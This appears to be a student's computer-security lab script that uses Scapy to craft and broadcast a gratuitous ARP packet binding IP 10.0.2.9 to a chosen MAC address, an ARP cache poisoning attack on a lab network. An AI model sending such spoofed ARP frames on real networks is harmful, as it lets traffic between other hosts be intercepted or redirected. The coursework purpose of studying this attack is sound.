#!/usr/bin/python3

'''
	Name: Joshua Ludolf
	Class: CSCI 4321 - Computer Security
'''

from scapy.all import *

E = Ether(dst='ff:ff:ff:ff:ff:ff', src='02:42:0a:09:00:69')
A = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.0.2.9', 
	hwdst='ff:ff:ff:ff:ff:ff', pdst='10.0.2.9')

pkt = E/A
pkt.show()
sendp(pkt)
